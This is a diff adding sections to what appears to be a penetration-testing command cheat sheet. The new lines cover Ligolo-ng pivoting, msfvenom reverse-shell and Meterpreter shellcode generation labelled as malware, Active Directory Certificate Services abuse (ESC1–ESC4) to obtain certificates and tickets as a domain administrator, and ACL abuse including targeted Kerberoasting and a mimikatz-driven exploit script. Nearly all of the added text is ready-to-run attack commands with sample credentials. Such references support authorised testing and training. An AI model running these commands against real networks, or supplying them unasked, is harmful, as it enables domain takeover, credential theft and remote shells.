@@ -1371,3 +1371,68 @@ echo "passw0rd" | docker secret create <name> -		# import secret text
 docker secrets ls		# List all the secrets
 docker service update --secret-rm		# Remove the secret
 docker stack rm <name>		# Also cleans the secrets file
+
+#  LIGOLO-NG
+#
+proxy -selfcert #'-selfcert' option, which operates on port 11601 - Ligolo-ng
+agent.exe -connect 192.168.1.5:11601 -ignore-cert  # Connect - Ligolo-ng
+session  # Choose the session showing the new network - ligolo-ng
+ip route add 192.168.148.0/24 dev ligolo     # the internal IP will be added to the IP route -ligolo-ng
+ip route list   # confirm the route added - ligolo-ng
+start   # initiate the tunneling process by entering the 'start' - ligolo-ng
+listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444  # Double Pivoting - addition of a listener to traverse the intra-network and retrieve the session # ligolo-ng
+
+
+# MALWARE DEVELOPMENT
+	
+## MSFVENOM ShellCode
+
+msfvenom -p windows/shell_reverse_tcp LHOST=your_IP LPORT=your_port -f c    # Windows Reverse TCP Shell en Shellcode, malware
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=your_IP LPORT=your_port -f c  # Windows Meterpreter Reverse TCP en Shellcode, malware
+msfvenom -p windows/exec CMD=”cmd.exe /C your_command” -f c # CMD Windows Executable Shellcode, malware
+msfvenom -p windows/messagebox TEXT=”Message” -f c  # Windows Message Box Shellcode, malware
+
+# ADCS ENUMERATION | CERTICATES
+netexec ldap domain.lab -u username -p password -M adcs 	# adcs enumeration | certificates
+ldapsearch -H ldap://dc_IP -x -LLL -D 'CN=<user>,OU=Users,DC=domain,DC=local' -w '<password>' -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=CONFIGURATION,DC=domain,DC=local" dNSHostName	# adcs enumeration | certificates
+certutil.exe -config - -ping	# adcs enumeration | certificates
+certutil -dump	# adcs enumeration | certificates
+## # ADCS ENUMERATION | CERTICATES | ESC1 | Misconfigured Certificate Templates
+Certify.exe find /vulnerable	# adcs | vulnerable templates | enumeration
+Certify.exe find /vulnerable /currentuser	# # adcs | vulnerable templates | enumeration
+PS> Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))' -SearchBase 'CN=Configuration,DC=lab,DC=local'	 # adcs | vulnerable templates | enumeration | ESC1
+certipy 'domain.local'/'user':'password'@'domaincontroller' find -bloodhound	# adcs | vulnerable templates | enumeration | ESC1
+python bloodyAD.py -u john.doe -p 'Password123!' --host 192.168.100.1 -d bloody.lab get search --base 'CN=Configuration,DC=lab,DC=local' --filter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))'	# adcs | vulnerable templates | enumeration | ESC1
+Certify.exe request /ca:dc.domain.local\domain-DC-CA /template:VulnTemplate /altname:domadmin	 # ADCS | ESC1 | request a Certificate and add an alternative name (user to impersonate)
+certi.py req 'contoso.local/Anakin@dc01.contoso.local' contoso-DC01-CA -k -n --alt-name han --template UserSAN	 # ADCS | ESC1 | request a Certificate and add an alternative name (user to impersonate)
+certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC1' -alt 'administrator@corp.local'	 # ADCS | ESC1 | request a Certificate and add an alternative name (user to impersonate)
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx	# #	ADCS | ESC1 | Use OpenSSL and convert the certificate, do not enter a password
+Rubeus.exe asktgt /user:domadmin /certificate:C:\Temp\cert.pfx	# ADCS | ESC1 | Move the cert.pfx to the target machine filesystem and request a TGT for the altname user using Rubeus
+## # ADCS ENUMERATION | CERTICATES | ESC2 | Misconfigured Certificate Templates
+PS > Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))' -SearchBase 'CN=Configuration,DC=megacorp,DC=local'	# ADCS | ESC2 | Request a certificate specifying the /altname as a domain admin like in ESC1
+python bloodyAD.py -u john.doe -p 'Password123!' --host 192.168.100.1 -d bloody.lab get search --base 'CN=Configuration,DC=megacorp,DC=local' --filter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))'	# ADCS | ESC2 | Request a certificate specifying the /altname as a domain admin like in ESC1
+## # ADCS ENUMERATION | CERTICATES | ESC3 | Misconfigured Enrollment Agent Templates
+certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC3' [*] Saved certificate and private key to 'john.pfx'	# ADCS | ESC3 | Request a certificate based on the vulnerable certificate template ESC3
+certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'		# ADCS | ESC3 | Use the Certificate Request Agent certificate (-pfx) to request a certificate on behalf of other another user
+## # ADCS ENUMERATION | CERTICATES | ESC4 | Access Control Vulnerabilities
+python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -get-acl 	# ADCS | ESC1 | Search for WriteProperty with value 00000000-0000-0000-0000-000000000000 using modifyCertTemplate
+python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -add enrollee_supplies_subject -property mspki-Certificate-Name-Flag	# # ADCS | ESC1 | Add the ENROLLEE_SUPPLIES_SUBJECT (ESS) flag to perform ESC1
+C:\>StandIn.exe --adcs --filter WebServer --ess --add	# ADCS | ESC1 | Add/remove ENROLLEE_SUPPLIES_SUBJECT flag from the WebServer template.
+python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -value 0 -property mspki-Certificate-Name-Flag	# ADCS | ESC1 | Perform ESC1 and then restore the value
+certipy template 'corp.local/johnpc$@ca.corp.local' -hashes :fc525c9683e8fe067095ba2ddc971889 -template 'ESC4' -save-old	# ADCS | ESC1 | overwrite the configuration to make it vulnerable to ESC1
+certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC4' -alt 'administrator@corp.local'	# ADCS | ESC1 | # request a certificate based on the ESC4 template, just like ESC1
+certipy template 'corp.local/johnpc$@ca.corp.local' -hashes :fc525c9683e8fe067095ba2ddc971889 -template 'ESC4' -configuration ESC4.json	# ADCS | ESC1 | # restore the old configuration
+
+# Active Directory - Access Controls ACL/ACE
+ADACLScan.ps1 -Base "DC=contoso;DC=com" -Filter "(&(AdminCount=1))" -Scope subtree -EffectiveRightsPrincipal User1 -Output HTML -Show 	# Check ACL for an User with ADACLScanner.
+./Invoke-ACL.ps1 -SharpHoundLocation .\sharphound.exe -mimiKatzLocation .\mimikatz.exe -Username 'user1' -Domain 'domain.local' -Password 'Welcome01!'	# Automate ACL exploit 
+
+## Active Directory - Access Controls ACL/ACE | GenericAll/GenericWrite
+bloodyAD --host 10.10.10.10 -d attack.lab -u john.doe -p 'Password123*' get writable --otype USER --right WRITE --detail | egrep -i 'distinguishedName|servicePrincipalName' 	# ACL | GenericAll/GenericWrite | User/Computer | Windows/Linux | Check for interesting permissions on accounts
+bloodyAD --host 10.10.10.10 -d attack.lab -u john.doe -p 'Password123*' get object <UserName> --attr serviceprincipalname 	# ACL | GenericAll/GenericWrite | User/Computer | Windows/Linux | Check if current user has already an SPN setted
+bloodyAD --host 10.10.10.10 -d attack.lab -u john.doe -p 'Password123*' set object <UserName> serviceprincipalname -v 'ops/whatever1'	# ACL | GenericAll/GenericWrite | User/Computer | Windows/Linux | Force set the SPN on the account: Targeted Kerberoasting
+GetUsersSPNs.py -dc-ip 10.10.10.10 'attack.lab/john.doe:Password123*' -request-user <UserName>	# ACL | GenericAll/GenericWrite | User/Computer | Windows/Linux | Grab the ticket
+bloodyAD --host 10.10.10.10 -d attack.lab -u john.doe -p 'Password123*' set object <UserName> serviceprincipalname	# ACL | GenericAll/GenericWrite | User/Computer | Windows/Linux | Remove the SPN
+
+
+
